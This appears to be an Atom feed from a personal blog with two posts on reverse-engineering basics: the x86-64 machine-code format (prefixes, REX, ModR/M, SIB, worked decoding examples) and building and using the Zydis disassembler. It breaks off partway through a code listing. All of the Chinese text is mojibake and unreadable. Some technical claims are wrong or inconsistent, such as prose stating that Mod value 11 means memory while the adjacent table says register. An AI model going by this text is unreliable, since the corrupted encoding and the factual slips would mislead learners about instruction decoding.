<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>pRism</title>
  
  
  <link href="https://www.pri87.vip/atom.xml" rel="self"/>
  
  <link href="https://www.pri87.vip/"/>
  <updated>2025-04-01T01:12:18.580Z</updated>
  <id>https://www.pri87.vip/</id>
  
  <author>
    <name>pRism</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>X86-64æ±‡ç¼–æœºå™¨ç æ ¼å¼</title>
    <link href="https://www.pri87.vip/posts/47eb1508.html"/>
    <id>https://www.pri87.vip/posts/47eb1508.html</id>
    <published>2025-03-31T07:29:42.000Z</published>
    <updated>2025-04-01T01:12:18.580Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åŸºæœ¬ç»“æ„">åŸºæœ¬ç»“æ„</h2><p><img src="https://s2.loli.net/2025/03/31/vEYwI5kGshboazd.png" alt="image-20250331153157959"></p><p><img src="https://s2.loli.net/2025/03/31/r9fHQj3BgMu1mDL.png" alt="image-20250331155123077"></p><p>è¯¥å›¾è¯´æ˜ï¼šä¸»æ“ä½œç ä¸€å®šæœ‰ï¼Œç”±äºå…¶å®ƒå†…å®¹ä¸ä¸€å®šåœ¨ä¸€æ¡æŒ‡ä»¤ä¸­ï¼Œæ‰€ä»¥æŒ‡ä»¤é•¿åº¦ä¸å›ºå®š</p><h3 id="ç¬¦å·è¯´æ˜">ç¬¦å·è¯´æ˜</h3><p>Gï¼šå¯„å­˜å™¨<br>Eï¼šå¯„å­˜å™¨/å†…å­˜<br>bï¼šå•å­—èŠ‚<br>vï¼šæ ¹æ®æ“ä½œç³»ç»Ÿåˆ¤æ–­ä½æ•°ï¼Œä¸€èˆ¬æ•°é»˜è®¤32ä½ï¼Œåœ°å€é»˜è®¤64ä½</p><p>MOV Gv Evï¼šæ„æ€æ˜¯æŠŠä¸€ä¸ªå†…å­˜æˆ–å¯„å­˜å™¨çš„å€¼æ”¾åˆ°ä¸€ä¸ªå¯„å­˜å™¨ä¸­ï¼Œå¤§å°æ ¹æ®æ“ä½œç³»ç»Ÿå†³å®š</p><p>ç°åœ¨ä¾æ¬¡ä»‹ç»è¿™å‡ ä¸ª</p><h2 id="æŒ‡ä»¤å‰ç¼€ï¼ˆInstruction-Prefixesï¼‰">æŒ‡ä»¤å‰ç¼€ï¼ˆInstruction Prefixesï¼‰</h2><p>å‰ç¼€åˆ†ä¸º 4 ç±»ï¼Œä½¿ç”¨æ—¶ï¼Œä¸åŒºåˆ†å‰åé¡ºåºï¼Œä¸”æ¯ç»„æœ€å¤šå‡ºç°ä¸€ä¸ªï¼š</p><p>1.é”å®šå’Œé‡å¤å‰ç¼€</p><table><thead><tr><th>å‰ç¼€</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>F0</td><td>ä½¿æ“ä½œå˜ä¸ºåŸå­æ“ä½œ</td></tr><tr><td>F2</td><td>REPNE/REPNZï¼Œé‡å¤å‰ç¼€ï¼Œç”¨äºä¸²å’Œ IO</td></tr><tr><td>F3</td><td>REP æˆ– REPE/REPZï¼Œç”¨äºä¸²å’Œ IO</td></tr></tbody></table><p>2.æ®µé‡è½½</p><table><thead><tr><th>å‰ç¼€</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>2E</td><td>CS æ®µé‡è½½</td></tr><tr><td>36</td><td>SS æ®µé‡è½½</td></tr><tr><td>3E</td><td>DS æ®µé‡è½½</td></tr><tr><td>26</td><td>ES æ®µé‡è½½</td></tr><tr><td>64</td><td>FS æ®µé‡è½½</td></tr><tr><td>65</td><td>GS æ®µé‡è½½</td></tr><tr><td>2E</td><td>åˆ†æ”¯ä¸€èˆ¬ä¸è·³è½¬ï¼Œç”¨äºæç¤º CPU è¿›è¡Œé¢„æµ‹</td></tr><tr><td>3E</td><td>åˆ†æ”¯ä¸€èˆ¬è·³è½¬ï¼Œç”¨äºæç¤º CPU è¿›è¡Œé¢„æµ‹</td></tr></tbody></table><p>3.æ“ä½œæ•°å¤§å°é‡è½½</p><table><thead><tr><th>å‰ç¼€</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>66</td><td>å°†é»˜è®¤æ“ä½œæ•°å¤§å°ä» 32 ä½è½¬ä¸º 16 ä½</td></tr></tbody></table><p>4.æ“ä½œåœ°å€å¤§å°é‡è½½</p><table><thead><tr><th>å‰ç¼€</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>67</td><td>å°†é»˜è®¤çš„ 64 ä½åœ°å€å¤§å°è½¬ä¸º 32 ä½</td></tr></tbody></table><h2 id="REX-å‰ç¼€">REX å‰ç¼€</h2><p>REX ç”¨æ¥æ‰©å±•æŒ‡ä»¤ä» 32 ä½åˆ° 64 ä½ï¼Œè¿™ä¸€éƒ¨åˆ†çš„å†…å®¹éœ€è¦å…ˆçœ‹åé¢çš„å‡ ä¸ªéƒ¨åˆ†æ‰èƒ½çœ‹æ‡‚</p><p>å ä¸€å­—èŠ‚ï¼Œå¯ä»¥æ²¡æœ‰</p><p><img src="https://s2.loli.net/2025/03/31/uBJv1dEkf8NXGpD.png" alt="image-20250331160405462"></p><p>å°†å¯¹åº”åŸŸç½® 1 å°±å¯ä»¥ä½¿ç›®æ ‡æ‰©å±•</p><p>å…¶ä¸­ç»å¸¸ä½¿ç”¨çš„å°±æ˜¯ 48ï¼Œè®©æ“ä½œæ•°å˜ä¸º 64 ä½å¤§å°</p><h2 id="æ“ä½œç ">æ“ä½œç </h2><p>ä¸€èˆ¬æ¥è¯´ï¼Œä¸»æ“ä½œç é•¿åº¦ä¸º 1 åˆ° 3 å­—èŠ‚ï¼ŒModR/M å¯èƒ½ç¼–ç é™„åŠ çš„ 3 ä½æ“ä½œç </p><p>åŒå­—èŠ‚ï¼š0F+ç¬¬äºŒä¸ªæ“ä½œç å­—èŠ‚ æˆ– ä¸€ä¸ªå‰ç¼€(66H, F2H, æˆ– F3H)+0F+ç¬¬äºŒä¸ªæ“ä½œç å­—èŠ‚<br>ä¸‰å­—èŠ‚ï¼š0F+åä¸¤ä¸ªæ“ä½œç å­—èŠ‚ æˆ– ä¸€ä¸ªå‰ç¼€(66H, F2H, æˆ– F3H)+0F+åä¸¤ä¸ªæ“ä½œç å­—èŠ‚</p><p>éƒ¨åˆ†å†…å®¹éœ€è¦å…ˆçœ‹åé¢çš„</p><p>ä¸‹é¢ä¸º 1 åˆ° 3 å­—èŠ‚æŒ‡ä»¤çš„æŸ¥è¡¨</p><p><img src="https://s2.loli.net/2025/03/31/JqnVpF7uomvaj4L.png" alt="image-20250331161314311"></p><p><img src="https://s2.loli.net/2025/03/31/LFVOx9YB4whqlIG.png" alt="image-20250331161329868"></p><p><img src="https://s2.loli.net/2025/03/31/y35PrtfsOdVNcZi.png" alt="image-20250331161339920"></p><p><img src="https://s2.loli.net/2025/03/31/MRiwKW1ZmSj83GQ.png" alt="image-20250331161350193"></p><p><img src="https://s2.loli.net/2025/03/31/hTMljvS2V6nPRXW.png" alt="image-20250331161359418"></p><p><img src="https://s2.loli.net/2025/03/31/rogQINylSKYHLJ3.png" alt="image-20250331161408747"></p><p><img src="https://s2.loli.net/2025/03/31/Ax95rqsP4VI3fNc.png" alt="image-20250331161419001"></p><p><img src="https://s2.loli.net/2025/03/31/LhElcWowv7MtYCi.png" alt="image-20250331161429738"></p><p><img src="https://s2.loli.net/2025/03/31/dDWFZ32bXHqLgQr.png" alt="image-20250331161439214"></p><p><img src="https://s2.loli.net/2025/03/31/sOSoX6rl5MiTzPf.png" alt="image-20250331161448469"></p><blockquote><p>ä»¥ä¸Šæˆªå–è‡ª IA32 æ‰‹å†Œ 2024-12 ç‰ˆçš„ 2929 é¡µè‡³ 2938 é¡µ</p></blockquote><p>é™¤äº†ä¸Šé¢çš„æŸ¥è¡¨æ–¹å¼ï¼Œx86-64 æŒ‡ä»¤è¿˜æœ‰å¦ä¸€ç§æ–¹å¼ï¼šé€šè¿‡ç»„æ¥æŸ¥è¯¢ï¼Œè¿™ç§æ–¹å¼ä½¿ç”¨äº†ä¸€å¼ æ–°è¡¨ï¼Œå«åšå•åŒå­—èŠ‚æ“ä½œç çš„æ“ä½œç æ‰©å±•</p><p>å…ˆé™„è¡¨</p><p><img src="https://s2.loli.net/2025/03/31/v3guPoV9xBY4HcI.png" alt="image-20250331163515951"></p><p><img src="https://s2.loli.net/2025/03/31/PflMsu9DHAa65Sg.png" alt="image-20250331163526702"></p><p><img src="https://s2.loli.net/2025/03/31/AWFud91GmSMNsYQ.png" alt="image-20250331165953065"></p><p><img src="https://s2.loli.net/2025/03/31/QaphGj7wUt8bKYs.png" alt="image-20250331170007852"></p><p><img src="https://s2.loli.net/2025/03/31/qKaURr7v9ew54cm.png" alt="image-20250331170031403"></p><p><img src="https://s2.loli.net/2025/03/31/ijDMHZgbCTVLUoQ.png" alt="image-20250331170044132"></p><p><img src="https://s2.loli.net/2025/03/31/glzF7n1DKhGYrE5.png" alt="image-20250331170056390"></p><p><img src="https://s2.loli.net/2025/03/31/tmDh75EdeKa93TC.png" alt="image-20250331170105301"></p><p><img src="https://s2.loli.net/2025/03/31/8ygvpfUW5sFHcMC.png" alt="image-20250331170116327"></p><p><img src="https://s2.loli.net/2025/03/31/9lIOjfepRrqGBLm.png" alt="image-20250331170126623"></p><p><img src="https://s2.loli.net/2025/03/31/2vhJ5iNDqRBG8bK.png" alt="image-20250331170135362"></p><p><img src="https://s2.loli.net/2025/03/31/STFlRIhLdAKUjnQ.png" alt="image-20250331170145112"></p><p><img src="https://s2.loli.net/2025/03/31/Mb8p9NrtxkF6imv.png" alt="image-20250331170154414"></p><p><img src="https://s2.loli.net/2025/03/31/2xaMiUDeQIPEln6.png" alt="image-20250331170205007"></p><p><img src="https://s2.loli.net/2025/03/31/2ICDLpAyMuXohHZ.png" alt="image-20250331170213809"></p><p><img src="https://s2.loli.net/2025/03/31/zChIJxtd6SDjqVQ.png" alt="image-20250331170226577"></p><p><img src="https://s2.loli.net/2025/03/31/ws6iqjJzf127Ktm.png" alt="image-20250331170241767"></p><p><img src="https://s2.loli.net/2025/03/31/v8ltPzSd52j1CxF.png" alt="image-20250331170254243"></p><blockquote><p>è¿™é‡Œæ˜¯ 2940 åˆ° 2950</p></blockquote><p>è€ƒè™‘ 80 C0 05</p><p>80 åœ¨è¡¨ A-6 ä¸­æ˜¯ Group 1ï¼Œç„¶åçœ‹ ModR/M å­—æ®µçš„ 5ï¼Œ4ï¼Œ3 ä½<br>C0:11000000ï¼Œ5ï¼Œ4ï¼Œ3 ä½ä¸º 000ï¼Œå³ 0ï¼ŒæŸ¥çºµåˆ—å¾— ADDï¼Œæ ¹æ®ä¹‹åçš„å†…å®¹å¯ä»¥çŸ¥é“ ModR/M æŒ‡å®šäº†å¯¹åº”çš„å†…å­˜å’Œå¯„å­˜å™¨ï¼Œæ‰€ä»¥å¾—åˆ° add al,5ï¼Œè¿™å’Œç¬¬ä¸€ç§ç›´æ¥æŸ¥è¡¨å¾—åˆ°çš„ 0405 çš„æŒ‡ä»¤ç›¸åŒ</p><h2 id="ModR-M">ModR/M</h2><p>å¦‚æœä¸€ä¸ªæ“ä½œç æ¶‰åŠå†…å­˜ï¼Œåé¢ä¸€èˆ¬å°±ä¼šæœ‰ä¸€ä¸ªå¯»å€æ ¼å¼è¯´æ˜å­—èŠ‚å³ ModR/Mï¼Œè€Œå¦‚æœ ModR/M ä¸­æåˆ°äº†éœ€è¦å†…å­˜å¯»å€ï¼Œé‚£ä¹ˆå°±éœ€è¦ SIB å­—èŠ‚å»è¿›ä¸€æ­¥è§£é‡Š</p><p>ModR/Må’ŒSIBå„æ¶‰åŠä¸‰ä¸ªåŸŸï¼š<br><img src="https://s2.loli.net/2025/03/31/RadXi6T4VHcKSOJ.png" alt="image-20250331171513102"></p><p><img src="https://s2.loli.net/2025/03/31/ZY7RDy4MJorbdUv.png" alt="image-20250331172923245"></p><h3 id="Modå¯»å€æ¨¡å¼">Modå¯»å€æ¨¡å¼</h3><p>æŒ‡æ˜æ“ä½œç ä¸­çš„Eæ˜¯å¯„å­˜å™¨è¿˜æ˜¯å†…å­˜ï¼Œ11æ˜¯å†…å­˜ï¼Œå…¶å®ƒéƒ½æ˜¯å¯„å­˜å™¨</p><table><thead><tr><th>Modå€¼</th><th>æè¿°</th><th>åç§»é‡</th></tr></thead><tbody><tr><td>00</td><td>å†…å­˜ï¼Œæ— åç§»é‡(é™¤é R/M=101)</td><td>æ— æˆ–32</td></tr><tr><td>01</td><td>å†…å­˜ï¼Œæœ‰8ä½åç§»</td><td>[base+8ä½åç§»]</td></tr><tr><td>10</td><td>å†…å­˜ï¼Œæœ‰32ä½åç§»</td><td>[base+32 ä½åç§»]</td></tr><tr><td>11</td><td>å¯„å­˜å™¨æ“ä½œæ•°</td><td>å¯„å­˜å™¨</td></tr></tbody></table><p>å‰ä¸‰ä¸ªä¸ºå†…å­˜ï¼Œåä¸€ä¸ªä¸ºæ•°</p><h3 id="Reg-Opcodeå¯„å­˜å™¨æˆ–æ“ä½œç æ‰©å±•">Reg/Opcodeå¯„å­˜å™¨æˆ–æ“ä½œç æ‰©å±•</h3><p>æŒ‡å®šä½¿ç”¨çš„regæˆ–opcodeæ‰©å±•ï¼š</p><table><thead><tr><th style="text-align:left">å€¼</th><th style="text-align:left">32 ä½å¯„å­˜å™¨</th><th style="text-align:left">16 ä½å¯„å­˜å™¨</th><th style="text-align:left">8 ä½å¯„å­˜å™¨</th><th style="text-align:left">ç”¨é€” (æ“ä½œç æ‰©å±•)</th></tr></thead><tbody><tr><td style="text-align:left">000</td><td style="text-align:left">EAX</td><td style="text-align:left">AX</td><td style="text-align:left">AL</td><td style="text-align:left">ADD</td></tr><tr><td style="text-align:left">001</td><td style="text-align:left">ECX</td><td style="text-align:left">CX</td><td style="text-align:left">CL</td><td style="text-align:left">OR</td></tr><tr><td style="text-align:left">010</td><td style="text-align:left">EDX</td><td style="text-align:left">DX</td><td style="text-align:left">DL</td><td style="text-align:left">ADC</td></tr><tr><td style="text-align:left">011</td><td style="text-align:left">EBX</td><td style="text-align:left">BX</td><td style="text-align:left">BL</td><td style="text-align:left">SBB</td></tr><tr><td style="text-align:left">100</td><td style="text-align:left">ESP</td><td style="text-align:left">SP</td><td style="text-align:left">AH</td><td style="text-align:left">AND</td></tr><tr><td style="text-align:left">101</td><td style="text-align:left">EBP</td><td style="text-align:left">BP</td><td style="text-align:left">CH</td><td style="text-align:left">SUB</td></tr><tr><td style="text-align:left">110</td><td style="text-align:left">ESI</td><td style="text-align:left">SI</td><td style="text-align:left">DH</td><td style="text-align:left">XOR</td></tr><tr><td style="text-align:left">111</td><td style="text-align:left">EDI</td><td style="text-align:left">DI</td><td style="text-align:left">BH</td><td style="text-align:left">CMP</td></tr></tbody></table><h3 id="R-Må¯„å­˜å™¨æˆ–å†…å­˜">R/Må¯„å­˜å™¨æˆ–å†…å­˜</h3><table><thead><tr><th style="text-align:left">R/M å€¼</th><th style="text-align:left">Mod = 11ï¼ˆå¯„å­˜å™¨ï¼‰</th><th style="text-align:left">Mod â‰  11ï¼ˆå†…å­˜åŸºå€/ç´¢å¼•ï¼‰</th></tr></thead><tbody><tr><td style="text-align:left">000</td><td style="text-align:left">EAX</td><td style="text-align:left">[RAX]</td></tr><tr><td style="text-align:left">001</td><td style="text-align:left">ECX</td><td style="text-align:left">[RCX]</td></tr><tr><td style="text-align:left">010</td><td style="text-align:left">EDX</td><td style="text-align:left">[RDX]</td></tr><tr><td style="text-align:left">011</td><td style="text-align:left">EBX</td><td style="text-align:left">[RBX]</td></tr><tr><td style="text-align:left">100</td><td style="text-align:left">ESP</td><td style="text-align:left">[SIB]ï¼ˆéœ€è¦ SIB å­—èŠ‚ï¼‰</td></tr><tr><td style="text-align:left">101</td><td style="text-align:left">EBP</td><td style="text-align:left">[RBP] æˆ–æ— åç§»/disp32</td></tr><tr><td style="text-align:left">110</td><td style="text-align:left">ESI</td><td style="text-align:left">[RSI]</td></tr><tr><td style="text-align:left">111</td><td style="text-align:left">EDI</td><td style="text-align:left">[RDI]</td></tr></tbody></table><p>å†…å­˜ç´¢å¼•çš„æ ‡å‡†æ ¼å¼ï¼š<code>base+index*scale+disp</code></p><h2 id="SIB">SIB</h2><p>SIBç”¨æ¥ç¡®å®šå…·ä½“çš„åœ°å€æ ¼å¼<br>å¦‚æœModR/Mä¸­Modä¸ä¸º11ï¼Œä¸”R/Mçš„å€¼ä¸º100ï¼Œåˆ™åä¸€ä¸ªå­—èŠ‚ä¸ºSIB</p><p>ModR/Må’ŒSIBå„æ¶‰åŠä¸‰ä¸ªåŸŸï¼š<br><img src="https://s2.loli.net/2025/03/31/RadXi6T4VHcKSOJ.png" alt="image-20250331171513102"></p><p><img src="https://s2.loli.net/2025/03/31/bTHXZd9BnIeYQMw.png" alt="image-20250331190129120"></p><h3 id="Scaleæ¯”ä¾‹å› å­">Scaleæ¯”ä¾‹å› å­</h3><p>å†³å®šç´¢å¼•å¯„å­˜å™¨å€¼çš„å€æ•°</p><table><thead><tr><th>å€¼</th><th>æ¯”ä¾‹å› å­ (Scale)</th></tr></thead><tbody><tr><td>00</td><td>1</td></tr><tr><td>01</td><td>2</td></tr><tr><td>10</td><td>4</td></tr><tr><td>11</td><td>8</td></tr></tbody></table><h3 id="Indexç´¢å¼•å¯„å­˜å™¨">Indexç´¢å¼•å¯„å­˜å™¨</h3><table><thead><tr><th>å€¼</th><th>å¯„å­˜å™¨ (64 ä½æ¨¡å¼)</th><th>å¯„å­˜å™¨ (32 ä½æ¨¡å¼)</th></tr></thead><tbody><tr><td>000</td><td>RAX</td><td>EAX</td></tr><tr><td>001</td><td>RCX</td><td>ECX</td></tr><tr><td>010</td><td>RDX</td><td>EDX</td></tr><tr><td>011</td><td>RBX</td><td>EBX</td></tr><tr><td>100</td><td>æ— ç´¢å¼•å¯„å­˜å™¨</td><td>æ— ç´¢å¼•å¯„å­˜å™¨</td></tr><tr><td>101</td><td>RBP</td><td>EBP</td></tr><tr><td>110</td><td>RSI</td><td>ESI</td></tr><tr><td>111</td><td>RDI</td><td>EDI</td></tr></tbody></table><h3 id="BaseåŸºå€å¯„å­˜å™¨">BaseåŸºå€å¯„å­˜å™¨</h3><table><thead><tr><th>å€¼</th><th>å¯„å­˜å™¨ (64 ä½æ¨¡å¼)</th><th>å¯„å­˜å™¨ (32 ä½æ¨¡å¼)</th></tr></thead><tbody><tr><td>000</td><td>RAX</td><td>EAX</td></tr><tr><td>001</td><td>RCX</td><td>ECX</td></tr><tr><td>010</td><td>RDX</td><td>EDX</td></tr><tr><td>011</td><td>RBX</td><td>EBX</td></tr><tr><td>100</td><td>RSPï¼ˆéœ€ SIB æ‰©å±•ï¼‰</td><td>ESPï¼ˆéœ€ SIB æ‰©å±•ï¼‰</td></tr><tr><td>101</td><td>RBP æˆ– disp32(Mod=00)</td><td>EBP æˆ– disp32(Mod=00)</td></tr><tr><td>110</td><td>RSI</td><td>ESI</td></tr><tr><td>111</td><td>RDI</td><td>EDI</td></tr></tbody></table><h2 id="ç»ƒä¹ ">ç»ƒä¹ </h2><p>8B 41 10</p><p>8Bå¯¹åº”MOV Gv Ev</p><p>Gvè¯´æ˜ç›®æ ‡æ“ä½œæ•°æ˜¯å¯„å­˜å™¨ï¼ŒEvè¡¨ç¤ºæºæ“ä½œæ•°ä¸ºå¯„å­˜å™¨æˆ–åœ°å€<br>41æ˜¯ModR/M<br>01 000 001<br>01è¯´æ˜è¿™ä¸ªæŒ‡ä»¤çš„åœ°å€Evä¸ºå†…å­˜åœ°å€ä¸”æœ‰8bitåç§»ï¼Œ000è¯´æ˜Gvä¸ºAXç±»ï¼Œ001è¯´æ˜ç›®æ ‡æ“ä½œæ•°ä¸ºCXç±»<br>ç”±äºæ²¡æœ‰SIBï¼Œ10ä¸ºç«‹å³æ•°</p><p>æ‰€ä»¥æŒ‡ä»¤ä¸ºï¼šMOV EAX, [RCX+0x10]</p><hr><p>04 FF</p><p>04å¯¹åº”ADD AL,Lb</p><p>å·²ç»æŒ‡å®šå¯„å­˜å™¨ï¼Œåé¢ç›´æ¥è·Ÿç«‹å³æ•°ï¼ŒLbè¡¨æ˜æ˜¯ä¸€ä¸ªbyteï¼Œæ‰€ä»¥æ˜¯ADD AL ,0xff</p><hr><p>67 FF 34 88</p><p>67ä¸ºæŒ‡ä»¤å‰ç¼€ï¼Œè¡¨æ˜æŠŠä¹‹åçš„åœ°å€å€¼è½¬ä¸º32ä½<br>FFè¡¨æ˜è¦å»Grp $5^{1A}$<br>34ä¸ºModR/Mï¼š00 110 100å¾—åˆ°æŒ‡ä»¤æ˜¯PUSH Ev<br>00è¡¨æ˜ä¸ºä½¿ç”¨åœ°å€æ— åç§»ï¼Œ100è¡¨ç¤ºæ ¹æ®SIBç¡®å®šåœ°å€çš„å€¼</p><p>SIBï¼š10 001 000</p><p>10è¡¨æ˜æ¯”ä¾‹å› å­ä¸º4ï¼Œ001è¡¨æ˜ç´¢å¼•å¯„å­˜å™¨ä¸ºRCXï¼Œ000è¡¨æ˜åŸºå€å¯„å­˜å™¨ä¸ºRAX</p><p>æ ¹æ®æŒ‡ä»¤å‰ç¼€ï¼Œå°†åœ°å€ç›¸å…³å¯„å­˜å™¨å¤§å°è½¬ä¸º32ä½ï¼špush qword ptr [eax+ecx*4]</p>]]></content>
    
    
    <summary type="html">æœ¬ç¯‡ä»‹ç»x86-64ä¸‹æŒ‡ä»¤ç»“æ„</summary>
    
    
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="é€†å‘" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="åŸºç¡€" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="æœºå™¨ç " scheme="https://www.pri87.vip/tags/%E6%9C%BA%E5%99%A8%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>Zydisåç¼–è¯‘åº“ç¼–è¯‘åŠä½¿ç”¨æ–¹å¼</title>
    <link href="https://www.pri87.vip/posts/cbdd2395.html"/>
    <id>https://www.pri87.vip/posts/cbdd2395.html</id>
    <published>2025-03-28T13:27:56.000Z</published>
    <updated>2025-03-29T03:28:09.613Z</updated>
    
    <content type="html"><![CDATA[<p>Zydisæ˜¯ä¸€ä¸ªåæ±‡ç¼–åº“ï¼Œå¯ä»¥è§£ææœºå™¨æŒ‡ä»¤å°†å…¶è½¬ä¸ºæ±‡ç¼–ä»£ç ï¼Œä¸‹é¢æ˜¯ä½¿ç”¨æ–¹æ³•</p><h2 id="ä¸‹è½½">ä¸‹è½½</h2><p><a href="https://github.com/zyantific/zydis">zyantific/zydis: Fast and lightweight x86/x86-64 disassembler and code generation library</a></p><p>å¯ä»¥ç›´æ¥ä¸‹è½½releasesä¹Ÿå¯ä»¥ç›´æ¥clone</p><h2 id="ç¼–è¯‘">ç¼–è¯‘</h2><p>æ ‡å‡†çš„ç¼–è¯‘æ–¹æ³•ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone </span>--recursive <span class="string">&#x27;https://github.com/zyantific/zydis.git&#x27;</span></span><br><span class="line">cd zydis</span><br><span class="line">cmake -<span class="keyword">B </span><span class="keyword">build</span></span><br><span class="line"><span class="keyword"></span>cmake --<span class="keyword">build </span><span class="keyword">build </span>-<span class="keyword">j4</span></span><br></pre></td></tr></table></figure><h2 id="é…ç½®">é…ç½®</h2><p>å¦‚æœä½¿ç”¨çš„æ˜¯msvcï¼Œå¯ä»¥ç›´æ¥è¿›å…¥msvcç›®å½•ä½¿ç”¨vsç¼–è¯‘ï¼Œé…ç½®ä¸ºrelease MTï¼Œç›´æ¥ç”Ÿæˆã€‚</p><p>å¦‚æœæ˜¯ä¸Šé¢çš„æ–¹æ³•ï¼Œè¾“å‡ºæ–‡ä»¶åœ¨buildæ–‡ä»¶çš„debugç›®å½•ä¸‹å’ŒZycore\debugç›®å½•ï¼Œå¦‚æœæ˜¯ä¸‹é¢çš„æ–¹æ³•ï¼Œè¾“å‡ºæ–‡ä»¶åœ¨bin\releaseX64ä¸‹</p><p>å–å¾—ç”Ÿæˆçš„Zydis.libå’ŒZycore.libï¼Œæ”¾åœ¨é¡¹ç›®ç›®å½•çš„libæ–‡ä»¶å¤¹ä¸‹(æ–°å»º)ï¼Œç„¶ååœ¨æœ€å¤–é¢çš„zydisç›®å½•ä¸‹æ‰¾åˆ°includeå¤åˆ¶åˆ°é¡¹ç›®æ–‡ä»¶å¤¹ï¼Œåœ¨dependencies\zycoreä¸‹æ‰¾åˆ°includeæ–‡ä»¶å¤¹å¤åˆ¶åˆ°é¡¹ç›®æ–‡ä»¶å¤¹</p><p>åœ¨é¡¹ç›®å±æ€§ä¸­ï¼š</p><ul><li>C/C++<ul><li>å¸¸è§„ï¼šé™„åŠ åŒ…å«ç›®å½•æ·»åŠ ï¼š$(ProjectDir)include</li><li>é¢„å¤„ç†å™¨ï¼šé¢„å¤„ç†å™¨å®šä¹‰æ·»åŠ ï¼šZYDIS_STATIC_DEFINE</li></ul></li><li>é“¾æ¥å™¨<ul><li>å¸¸è§„ï¼šé™„åŠ åº“ç›®å½•åŒ…å«æ·»åŠ ï¼š$(ProjectDir)lib</li><li>è¾“å…¥ï¼šé™„åŠ ä¾èµ–é¡¹æ·»åŠ ï¼šZycore.lib;Zydis.lib</li></ul></li></ul><h2 id="å†™ä»£ç ">å†™ä»£ç </h2><p>å¼•ç”¨å¤´æ–‡ä»¶ï¼š<code>#include &lt;Zydis/Zydis.h&gt;</code></p><h2 id="è§£æå™¨">è§£æå™¨</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ZydisDecoderDecodeFull</span>(&amp;decoder, buffer.<span class="built_in">data</span>() + offset, length - offset,&amp;instruction, operands)</span><br></pre></td></tr></table></figure><p>decoderæ˜¯ZydisDecoderç±»å‹<br>instructionæ˜¯ZydisDecodedInstructionä¿å­˜åŸºæœ¬æŒ‡ä»¤æ•°æ®<br>operandsæ˜¯ZydisDecodedOperandç±»å‹æ•°ç»„ï¼Œä¿å­˜ä¸€æ¡æŒ‡ä»¤çš„æ“ä½œæ•°</p><p>dataæ˜¯å­˜æ”¾æœºå™¨ç çš„ç¼“å†²åŒº</p><p>æ¯æ¬¡æ‰§è¡Œä¸€æ¬¡è¿™ä¸ªæŒ‡ä»¤ï¼Œå°±ä¼šå¯¹instructionå’Œoperandsèµ‹å€¼ï¼Œè¡¨ç¤ºä¸€æ¡æŒ‡ä»¤çš„è§£æ</p><ul><li>instruction.mnemonic   åŠ©è®°ç¬¦</li><li>instruction.length    æŒ‡ä»¤æ€»é•¿åº¦</li><li>instruction.opcode    æœºå™¨ç </li><li>instruction.operand_count_visible    æ˜¾å¼æ“ä½œæ•°æ•°é‡</li><li>operand.type    è¿™ä¸ªæ“ä½œæ•°çš„ç±»å‹<ul><li>ç«‹å³æ•°(ZYDIS_OPERAND_TYPE_IMMEDIATE):<br>operand.imm.valueæ•°å€¼</li><li>å¯„å­˜å™¨(ZYDIS_OPERAND_TYPE_REGISTER):<br>operand.reg.valueå¯„å­˜å™¨åç§°</li><li>å†…å­˜åœ°å€(ZYDIS_OPERAND_TYPE_MEMORY):<br>operand.mem.baseè¡¨ç¤ºå†…å­˜çš„åŸºå€å¯„å­˜å™¨<br>operand.mem.indexè¡¨ç¤ºç´¢å¼•å¯„å­˜å™¨<br>operand.mem.dispåœ°å€åç§»å€¼</li></ul></li></ul><p>ä½¿ç”¨æ¨¡æ¿å¯ä»¥å‚è€ƒexampleå’Œä¸‹é¢è¿™ä¸ª</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 